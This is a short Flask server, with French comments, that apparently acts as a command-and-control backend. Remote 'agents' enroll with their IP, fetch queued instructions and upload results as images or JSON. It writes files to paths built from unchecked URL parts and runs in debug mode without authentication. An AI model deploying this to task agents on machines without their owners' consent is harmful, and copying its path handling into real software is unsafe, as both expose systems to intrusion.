from flask import Flask, request, json
import json, os
from PIL import Image
from flask_cors import CORS


app = Flask(__name__)
CORS(app)  # Active CORS pour toute l'application

instructionsDic = {}

@app.route('/agents')
def agents():
    with open('agentsList.json', 'r') as agents:
        agentsDic = json.load(agents)
    return agentsDic

@app.route('/enroll/<name>')
def enroll(name):
    with open('agentsList.json', 'r') as agents:
        try:
            existing = json.load(agents)
        except:
            existing = {}
    with open('agentsList.json', 'w') as agents:
        existing[name] = str(request.remote_addr)
        agents.seek(0)
        json.dump(existing, agents)
        agents.truncate()
    instructionsDic[name]=""
    return '', 200

@app.route('/instruction/<name>')
def instructions(name):
    todo=instructionsDic[name]
    instructionsDic[name] = ""
    return todo, 200

@app.route('/addInstruction/<name>/<instruction>', methods=['POST'])
def addInstructions(name, instruction):
    instructionsDic[name]=instruction
    print("ajout de l'instruction "+instruction)
    return instructionsDic

@app.route('/data/<name>/<instruction>', methods=['POST'])
def data(name, instruction):
    # TODO traiter les différents formats : json, image, texte
    contentType = request.content_type
    if 'multipart/form-data' in contentType and 'file' in request.files:
        file = request.files['file']
        path=name+'/'+instruction+'.png'
        image = Image.open(file.stream)
        os.makedirs(os.path.dirname(path), exist_ok=True)
        image.save(path)
    elif 'application/json' in contentType:
        data=request.json
        path=name+'/'+instruction+'.json'
        os.makedirs(os.path.dirname(path), exist_ok=True)
        with open(path, 'w') as file:
            file.seek(0)
            json.dump(data, file)
            file.truncate()
    return '',200

@app.route('/quit/<name>', methods=['POST'])
def quit(name):
    with open('agentsList.json', 'r') as agents:
        existing = json.load(agents)
    existing.pop(name)
    with open('agentsList.json', 'w') as agents:
        json.dump(existing,agents)

    return '',200

if __name__ == '__main__':
	app.run(host="127.0.0.1",debug=True, port=5000)
 